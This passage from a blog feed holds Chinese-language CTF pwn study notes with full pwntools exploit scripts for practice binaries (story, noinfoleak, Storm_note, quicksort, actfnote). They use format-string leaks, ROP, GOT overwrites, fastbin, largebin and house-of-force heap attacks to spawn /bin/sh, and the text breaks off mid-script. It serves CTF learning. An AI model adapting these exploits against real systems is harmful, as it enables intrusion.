main</span></span><br><span class="line">    <span class="number">0x0000000000400C47</span>  <span class="comment"># case1</span></span><br><span class="line">])</span><br><span class="line">pay = pay.ljust(<span class="number">0x90</span>, <span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">case1(pay)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">ti()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;hws冬令营选拔赛复现&quot;&gt;&lt;a href=&quot;#hws冬令营选拔赛复现&quot; class=&quot;headerlink&quot; title=&quot;hws冬令营选拔赛复现&quot;&gt;&lt;/a&gt;hws冬令营选拔赛复现&lt;/h1&gt;&lt;p&gt;拖延半年&lt;/p&gt;
&lt;h3 id=&quot;pwn&quot;&gt;&lt;a href=&quot;#pw</summary>
      
    
    
    
    
    <category term="pwn" scheme="https://brooke-hub.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>tonight</title>
    <link href="https://brooke-hub.github.io/2021/04/21/tonight/"/>
    <id>https://brooke-hub.github.io/2021/04/21/tonight/</id>
    <published>2021-04-21T12:15:47.000Z</published>
    <updated>2021-04-25T07:15:32.698Z</updated>
    
    <content type="html"><![CDATA[<h3 id="4-8"><a href="#4-8" class="headerlink" title="4.8"></a>4.8</h3><ul><li>通过一字节修改mp_.tcache_bins，改大，并且把存放在堆空间上的tcache struct内容(一般在top chunk)修改为目标地址，那在调用tcache_get<strong>根据tc_idx索引</strong>取堆块时就会超过原来的范围向下取堆块，假设entries[tc_idx]恰好又不为0此似乎便会将起返回，从而申请到目标地址</li></ul><p><a href="https://mp.weixin.qq.com/s/xoc9LeME2fmIoWLM7IzTrw">VNCTF2021 LittleRedFlower</a></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1144313/1617852067326-b466d25c-efb4-4d9e-95da-a11680d56e18.png" alt="img"></p><p>但是这个tcache struct中entries数组对应的idx，要和申请的size相对应，暂时还不知道怎么确定偏移😭</p><ul><li><p>2.32对tcache新增的保护</p></li><li><p>fd是(chunk_addr &gt;&gt; 12)^(tcache-&gt;entries)  </p></li><li><p>那么第一个tcache chunk的fd 就是(chunk_addr &gt;&gt; 12)^0 (泄露出来再&lt;&lt;12就是heap_base啦)</p></li><li><p>之前tcache attack是直接把fd改为<code>目标地址</code>即可，现在把fd改为<code>(chunk_addr &gt;&gt; 12)^目标地址</code>就可以啦</p></li><li><p>直接打到tcache_perthread_struct，填0x290的count为7，free 该chunk就进入了unosrtedbin！</p></li><li><p>之后把unosrtedbin addr踩到tcache的指针处，爆破一位，申请到_IO_2_1_stdout_</p></li><li><p>得到libc之后接着改tcache指针</p></li><li><p><a href="https://mp.weixin.qq.com/s/1OzuKnQK2wNxhHYObN3UYA">VNCTF2021 ff</a></p></li></ul><ul><li>vmpwn好磨人😭屁股都坐痛了</li></ul><ul><li><p>pwntools 可以使用 <code>shutdown_raw(direction=&#39;send&#39;)</code> 关闭管道的 send 方向，使远程 <code>read()</code> 读到 EOF，返回 0</p></li><li><p>数组-1越界，爆破，如果程序任意申请到了flag附近的chunk，可直接泄露flag</p></li></ul><ul><li><img src="https://cdn.nlark.com/yuque/0/2021/png/1144313/1617871158045-9cb9392b-2e35-4bea-8c7a-e79372c4cd11.png" alt="img"></li></ul><h3 id="4-10"><a href="#4-10" class="headerlink" title="4.10"></a>4.10</h3><ul><li><p>huxiangbei_2019_namesystem </p></li><li><p>删除chunk时全局数组index漏了处理最后一位，指针悬空</p></li><li><p>没有show功能但是可以改free@got为printf@plt，在一个chunk中写入fmt，对栈进行泄漏，得到libc</p></li><li><p>要提前布置好两个double free，因为改完free@got就不能正常用free了</p></li></ul><h3 id="4-11"><a href="#4-11" class="headerlink" title="4.11"></a>4.11</h3><h3 id="4-12"><a href="#4-12" class="headerlink" title="4.12"></a>4.12</h3><h3 id="4-13"><a href="#4-13" class="headerlink" title="4.13"></a>4.13</h3><p>2019西湖论剑预选</p><p><strong>story</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">binary&#x3D;&#39;.&#x2F;story&#39;</span><br><span class="line">sh&#x3D;process(binary)</span><br><span class="line"># sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,29146)</span><br><span class="line">elf&#x3D;ELF(binary)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">context.arch&#x3D;&#39;amd64&#39;</span><br><span class="line">libc&#x3D;ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line"># libc&#x3D;ELF(&#39;libc-2.23.so&#39;)</span><br><span class="line"></span><br><span class="line">sa &#x3D; lambda s,n : sh.sendafter(s,n)</span><br><span class="line">sla &#x3D; lambda s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl &#x3D; lambda s : sh.sendline(s)</span><br><span class="line">sd &#x3D; lambda s : sh.send(s)</span><br><span class="line">rc &#x3D; lambda n : sh.recv(n)</span><br><span class="line">ru &#x3D; lambda s : sh.recvuntil(s)</span><br><span class="line">ti &#x3D; lambda : sh.interactive()</span><br><span class="line">leak &#x3D; lambda name,addr :log.success(name+&quot;:&quot;+hex(addr))</span><br><span class="line"></span><br><span class="line">sla(&#39;Your ID:&#39;,&#39;%15$p.%25$p&#39;)</span><br><span class="line">sh.recvuntil(&#39;0x&#39;)</span><br><span class="line">canary&#x3D;int(sh.recvuntil(&#39;.&#39;,drop&#x3D;True),16)</span><br><span class="line">leak(&#39;canary&#39;,canary)</span><br><span class="line">sh.recvuntil(&#39;0x&#39;)</span><br><span class="line">libc_base &#x3D;int(sh.recvuntil(&#39;\n&#39;,drop&#x3D;True),16) - libc.sym[&#39;__libc_start_main&#39;] - 240</span><br><span class="line">leak(&#39;libc_base&#39;,libc_base) </span><br><span class="line"></span><br><span class="line">sla(&#39;the size of your story:&#39;,str(0x400))</span><br><span class="line">pop_rdi&#x3D;0x0000000000400bd3</span><br><span class="line">binsh_addr&#x3D;libc_base+libc.search(&#39;&#x2F;bin&#x2F;sh\x00&#39;).next()</span><br><span class="line">system&#x3D;libc_base+libc.sym[&#39;system&#39;]</span><br><span class="line"># pause()</span><br><span class="line">sla(&#39;story:&#39;,&#39;a&#39;*(0x90-0x8)+p64(canary)+&#39;a&#39;*8+p64(pop_rdi)+p64(binsh_addr)+p64(system))</span><br><span class="line"># pause()</span><br><span class="line"># gdb.attach(sh)</span><br><span class="line">ti()</span><br></pre></td></tr></table></figure><h3 id="4-14"><a href="#4-14" class="headerlink" title="4.14"></a>4.14</h3><p><strong>noinfoleak</strong></p><p>全局指针上面的stdin内容可以伪造chunk size</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">binary&#x3D;&#39;.&#x2F;noinfoleak&#39;</span><br><span class="line">sh&#x3D;process(binary)</span><br><span class="line"># sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,29146)</span><br><span class="line">elf&#x3D;ELF(binary)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">context.arch&#x3D;&#39;amd64&#39;</span><br><span class="line">libc&#x3D;ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line"># libc&#x3D;ELF(&#39;libc-2.23.so&#39;)</span><br><span class="line"></span><br><span class="line">sa &#x3D; lambda s,n : sh.sendafter(s,n)</span><br><span class="line">sla &#x3D; lambda s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl &#x3D; lambda s : sh.sendline(s)</span><br><span class="line">sd &#x3D; lambda s : sh.send(s)</span><br><span class="line">rc &#x3D; lambda n : sh.recv(n)</span><br><span class="line">ru &#x3D; lambda s : sh.recvuntil(s)</span><br><span class="line">ti &#x3D; lambda : sh.interactive()</span><br><span class="line">leak &#x3D; lambda name,addr :log.success(name+&quot;:&quot;+hex(addr))</span><br><span class="line">def leaklibc():</span><br><span class="line">    global libc_base,__malloc_hook,__free_hook,system,binsh_addr,_IO_2_1_stdout_,_IO_list_all</span><br><span class="line">    libc_base &#x3D; u64(sh.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;)) - libc.sym[&#39;atoi&#39;]</span><br><span class="line">    success(&#39;libc_base &#x3D; &#39;+hex(libc_base))</span><br><span class="line">    __malloc_hook&#x3D;libc_base+libc.sym[&#39;__malloc_hook&#39;]</span><br><span class="line">    __free_hook&#x3D;libc_base+libc.sym[&#39;__free_hook&#39;]</span><br><span class="line">    system&#x3D;libc_base+libc.sym[&#39;system&#39;]</span><br><span class="line">def add(size,content):</span><br><span class="line">sla(&#39;&gt;&#39;,&#39;1&#39;)</span><br><span class="line">sla(&#39;&gt;&#39;,str(size))</span><br><span class="line">sa(&#39;&gt;&#39;,content)</span><br><span class="line">def dele(index):</span><br><span class="line">sla(&#39;&gt;&#39;,&#39;2&#39;)</span><br><span class="line">sla(&#39;&gt;&#39;,str(index))</span><br><span class="line">def edit(index,content):</span><br><span class="line">sla(&#39;&gt;&#39;,&#39;3&#39;)</span><br><span class="line">sla(&#39;&gt;&#39;,str(index))</span><br><span class="line">sa(&#39;&gt;&#39;,content)</span><br><span class="line"></span><br><span class="line">chunk_list&#x3D;0x0000000006010A0</span><br><span class="line">add(0x60,&#39;a\n&#39;)#0</span><br><span class="line">add(0x60,&#39;a\n&#39;)#1</span><br><span class="line">dele(0)</span><br><span class="line">edit(0,p64(chunk_list-0x13)+&#39;\n&#39;)</span><br><span class="line">add(0x60,&#39;a\n&#39;)#2</span><br><span class="line">add(0x60,&#39;b&#39;*0x3+p64(elf.got[&#39;free&#39;])+p64(0x60)+p64(elf.got[&#39;atoi&#39;])+p64(0x60)+&#39;\n&#39;)#3</span><br><span class="line"></span><br><span class="line"># add(0x50,&#39;a\n&#39;)#4</span><br><span class="line">edit(0,p64(elf.plt[&#39;puts&#39;]))</span><br><span class="line">dele(1)</span><br><span class="line">leaklibc()</span><br><span class="line"></span><br><span class="line">edit(1,p64(system))</span><br><span class="line">sla(&#39;&gt;&#39;,&#39;&#x2F;bin&#x2F;sh\x00&#39;)</span><br><span class="line"></span><br><span class="line"># gdb.attach(sh)</span><br><span class="line">ti()</span><br></pre></td></tr></table></figure><p><strong>Note_Storm</strong></p><p>libc2.23</p><p>largebin attack</p><p>禁用了fastbin，size可以很大，申请到0xABCD0100任意写就可以绕过检查</p><p>有off by null构造chunk overlap</p><p>设置fake pre size</p><p>dele 一个大chunk0，变成unsortedchunk</p><p>off by null修改unsortedchunk 的 pre inuse，并改小size</p><p>切割分配unsortedchunk为一个小chunk和一个大chunk1（要绕过size和对应pre size的检查，这是前面设置的fake pre size的作用）</p><p>dele 小chunk</p><p>再dele最开始那个大chunk0后面的chunk，由于它的pre size还保存着最开始那个大chunk0的size，它会直接全部合并，这里面就包括了还未被free的大chunk1</p><p>切割分配unsortedchunk为一个小chunk和一个大chunk2，就实现两个指针指向同一块内容</p><p>修改unsortedbin</p><p> <code>bk</code>为 <code>fake chunk（``0xABCD0100 -0x20``）</code></p><p>修改largebin（从unsortedbin申请一个chunk，会把剩余chunk放入largebin）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bk&#96;为 &#96;fake_chunk+8</span><br><span class="line">bk-&gt;nextsize&#96;为 &#96;fake_chunk-0x18-5</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">binary&#x3D;&#39;.&#x2F;Storm_note&#39;</span><br><span class="line">sh&#x3D;process(binary)</span><br><span class="line"># sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,29146)</span><br><span class="line">elf&#x3D;ELF(binary)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">context.arch&#x3D;&#39;amd64&#39;</span><br><span class="line">libc&#x3D;ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line"># libc&#x3D;ELF(&#39;libc-2.23.so&#39;)</span><br><span class="line"></span><br><span class="line">sa &#x3D; lambda s,n : sh.sendafter(s,n)</span><br><span class="line">sla &#x3D; lambda s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl &#x3D; lambda s : sh.sendline(s)</span><br><span class="line">sd &#x3D; lambda s : sh.send(s)</span><br><span class="line">rc &#x3D; lambda n : sh.recv(n)</span><br><span class="line">ru &#x3D; lambda s : sh.recvuntil(s)</span><br><span class="line">ti &#x3D; lambda : sh.interactive()</span><br><span class="line">leak &#x3D; lambda name,addr :log.success(name+&quot;:&quot;+hex(addr))</span><br><span class="line">def leaklibc():</span><br><span class="line">    global libc_base,__malloc_hook,__free_hook,system,binsh_addr,_IO_2_1_stdout_,_IO_list_all</span><br><span class="line">    libc_base &#x3D; u64(sh.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;)) - libc.sym[&#39;atoi&#39;]</span><br><span class="line">    success(&#39;libc_base &#x3D; &#39;+hex(libc_base))</span><br><span class="line">    __malloc_hook&#x3D;libc_base+libc.sym[&#39;__malloc_hook&#39;]</span><br><span class="line">    __free_hook&#x3D;libc_base+libc.sym[&#39;__free_hook&#39;]</span><br><span class="line">    system&#x3D;libc_base+libc.sym[&#39;system&#39;]</span><br><span class="line">def cmd(index):</span><br><span class="line">sla(&#39;Choice: &#39;,str(index))</span><br><span class="line">def add(size):</span><br><span class="line">cmd(1)</span><br><span class="line">sla(&#39;size ?&#39;,str(size))</span><br><span class="line"># sa(&#39;&gt;&#39;,content)</span><br><span class="line">def dele(index):</span><br><span class="line">cmd(3)</span><br><span class="line">sla(&#39;Index ?&#39;,str(index))</span><br><span class="line">def edit(index,content):</span><br><span class="line">cmd(2)</span><br><span class="line">sla(&#39;Index ?&#39;,str(index))</span><br><span class="line">sa(&#39;Content:&#39;,content)</span><br><span class="line">def backdoor(buff):</span><br><span class="line">cmd(666)</span><br><span class="line">sa(&#39;let you in&#39;,buff)</span><br><span class="line"></span><br><span class="line">add(0x18)     #0</span><br><span class="line">add(0x508)    #1</span><br><span class="line">add(0x18)     #2</span><br><span class="line">edit(1, &#39;h&#39;*0x4f0 + p64(0x500))   #set fake prev_size</span><br><span class="line"></span><br><span class="line">add(0x18)     #3</span><br><span class="line">add(0x508)    #4</span><br><span class="line">add(0x18)     #5</span><br><span class="line">edit(4, &#39;h&#39;*0x4f0 + p64(0x500))   #set fake prev_size</span><br><span class="line">add(0x18)     #6</span><br><span class="line"></span><br><span class="line"># &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">dele(1)</span><br><span class="line">edit(0, &#39;h&#39;*(0x18))    #off-by-one chunk1 0x510-&gt;0x500</span><br><span class="line">add(0x18)     #1</span><br><span class="line">add(0x4d8)    #7</span><br><span class="line">dele(1)</span><br><span class="line">dele(2)         #backward consolidate</span><br><span class="line">add(0x38)     #1</span><br><span class="line">add(0x4e8)    #2</span><br><span class="line"></span><br><span class="line">dele(4)</span><br><span class="line">edit(3, &#39;h&#39;*(0x18))    #off-by-one</span><br><span class="line">add(0x18)     #4</span><br><span class="line">add(0x4d8)    #8</span><br><span class="line">dele(4)</span><br><span class="line">dele(5)         #backward consolidate</span><br><span class="line">add(0x48)     #4</span><br><span class="line"></span><br><span class="line">dele(2) # two chunks in unsortedbin</span><br><span class="line">add(0x4e8)    #2 now malloc unsortedchunk2 and put unsortedchcunk5 to largebin</span><br><span class="line">dele(2) # in unsortedbin</span><br><span class="line"></span><br><span class="line"># modify unsortedbin</span><br><span class="line">storage &#x3D; 0xabcd0100</span><br><span class="line">fake_chunk &#x3D; storage - 0x20</span><br><span class="line">p1 &#x3D; p64(0)*2 + p64(0) + p64(0x4f1) #size</span><br><span class="line">p1 +&#x3D; p64(0) + p64(fake_chunk)      #bk</span><br><span class="line">edit(7, p1)</span><br><span class="line"></span><br><span class="line"># modify largebin</span><br><span class="line">p2 &#x3D; p64(0)*4 + p64(0) + p64(0x4e1) #size</span><br><span class="line">p2 +&#x3D; p64(0) + p64(fake_chunk+8)    #bk, for creating the &quot;bk&quot; of the faked chunk to avoid crashing when unlinking from unsorted bin</span><br><span class="line">p2 +&#x3D; p64(0) + p64(fake_chunk-0x18-5)   #bk_nextsize, for creating the &quot;size&quot; of the faked chunk, using misalignment tricks</span><br><span class="line">edit(8, p2)</span><br><span class="line"></span><br><span class="line">add(0x48)#2 malloc to 0xabcd0100</span><br><span class="line">edit(2,p64(0)*8)</span><br><span class="line"></span><br><span class="line">backdoor(&#39;\x00&#39;*0x30)</span><br><span class="line"># gdb.attach(sh)</span><br><span class="line">ti()</span><br></pre></td></tr></table></figure><h3 id="4-15"><a href="#4-15" class="headerlink" title="4.15"></a>4.15</h3><p>模板</p><p>starCTF2019 quicksort</p><p>实际上重点不是快排，有一个栈溢出可以覆盖到ptr指针，</p><p>控制栈对指针指向内容读写</p><p>输出地址为十进制，是负数，加上0x100000000就可以还原成十六进制地址了</p><p>同样写入atoi@plt的时候，也将system地址减去0x100000000，变成十进制负数</p><p>index也存放在栈上，覆盖时需要注意</p><p>atoi(s) // s= str(addr)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"># context.arch&#x3D;&#39;amd64&#39;</span><br><span class="line"></span><br><span class="line">binary &#x3D; &#39;.&#x2F;starctf_2019_quicksort&#39;</span><br><span class="line">elf&#x3D;ELF(binary)</span><br><span class="line"># libc &#x3D; ELF(&quot;&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.23.so&quot;)</span><br><span class="line">libc &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)</span><br><span class="line">flag&#x3D;1</span><br><span class="line">if flag:</span><br><span class="line">    sh &#x3D; remote(&#39;node3.buuoj.cn&#39;,25177)</span><br><span class="line">else:</span><br><span class="line">    sh &#x3D; process(binary)</span><br><span class="line"></span><br><span class="line">sa &#x3D; lambda s,n : sh.sendafter(s,n)</span><br><span class="line">sla &#x3D; lambda s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl &#x3D; lambda s : sh.sendline(s)</span><br><span class="line">sd &#x3D; lambda s : sh.send(s)</span><br><span class="line">rc &#x3D; lambda n : sh.recv(n)</span><br><span class="line">ru &#x3D; lambda s : sh.recvuntil(s)</span><br><span class="line">ti &#x3D; lambda : sh.interactive()</span><br><span class="line">leak &#x3D; lambda name,addr :log.success(name+&quot;:&quot;+hex(addr))</span><br><span class="line"></span><br><span class="line">vuln &#x3D; 0x8048816</span><br><span class="line">sla(&#39;want to sort?&#39;,&#39;1&#39;)</span><br><span class="line"># pause()</span><br><span class="line"># [0x804a014] gets@GLIBC_2.0 -&gt; 0xf7d9c3f0 (gets) ◂— push ebp</span><br><span class="line"># [0x804a018] free@GLIBC_2.0 -&gt; 0x8048816 ◂— push   ebp</span><br><span class="line"># ptr+4--&gt;free@plt</span><br><span class="line">sla(&#39;number:&#39;,str(vuln).ljust(0x10,&#39;\x00&#39;)+p32(1)+p32(1)+p32(0)+p32(elf.got[&#39;gets&#39;]))</span><br><span class="line"># pause()</span><br><span class="line">sh.recvuntil(&#39;result:&#39;)</span><br><span class="line">libc_base &#x3D; int(sh.recvuntil(&#39; \n&#39;, drop&#x3D;True)) + \</span><br><span class="line">    0x100000000 - libc.sym[&#39;gets&#39;]</span><br><span class="line">leak(&#39;libc_base&#39;, libc_base)</span><br><span class="line">system&#x3D;libc_base+libc.sym[&#39;system&#39;]</span><br><span class="line">leak(&#39;system&#39;,system)</span><br><span class="line"></span><br><span class="line">sla(&#39;want to sort?&#39;, &#39;2&#39;)</span><br><span class="line">sla(&#39;number:&#39;, str(system-0x100000000).ljust(0x10, &#39;\x00&#39;) +</span><br><span class="line">    p32(2)+p32(0)+p32(0)+p32(elf.got[&#39;atoi&#39;]))</span><br><span class="line">sla(&#39;number:&#39;,&#39;&#x2F;bin&#x2F;sh\x00&#39;)</span><br><span class="line"># gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><strong>actf_2019_actfnote</strong></p><p>house of force</p><p>没注意到size可以是负数</p><p>edit可以覆盖到top chunk size</p><p>如何leak libc</p><p>strdup返回的字符串在使用完之后要及时用free释放掉</p><p>我们把截断符覆盖，栈内容就被复制到chunk中，之后show泄漏libc</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1144313/1618477908665-fcf16d88-1ea8-44ec-a82e-5c3fd77e3b4e.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2021/png/1144313/1618479134070-27cc4ebb-79e2-468f-8ee1-f6585f092557.png" alt="img"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"># context.arch&#x3D;&#39;amd64&#39;</span><br><span class="line"></span><br><span class="line">binary &#x3D; &#39;.&#x2F;ACTF_2019_ACTFNOTE&#39;</span><br><span class="line">elf&#x3D;ELF(binary)</span><br><span class="line">libc&#x3D;ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">if args[&#39;REMOTE&#39;]:</span><br><span class="line">    sh &#x3D; remote(sys.argv[1], sys.argv[2])</span><br><span class="line">else:</span><br><span class="line">    sh &#x3D; process(binary)</span><br><span class="line"></span><br><span class="line">sa &#x3D; lambda s,n : sh.sendafter(s,n)</span><br><span class="line">sla &#x3D; lambda s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl &#x3D; lambda s : sh.sendline(s)</span><br><span class="line">sd &#x3D; lambda s : sh.send(s)</span><br><span class="line">rc &#x3D; lambda n : sh.recv(n)</span><br><span class="line">ru &#x3D; lambda s : sh.recvuntil(s)</span><br><span class="line">ti &#x3D; lambda : sh.interactive()</span><br><span class="line">leak &#x3D; lambda name,addr :log.success(name+&quot;:&quot;+hex(addr))</span><br><span class="line">def leaklibc():</span><br><span class="line">    global 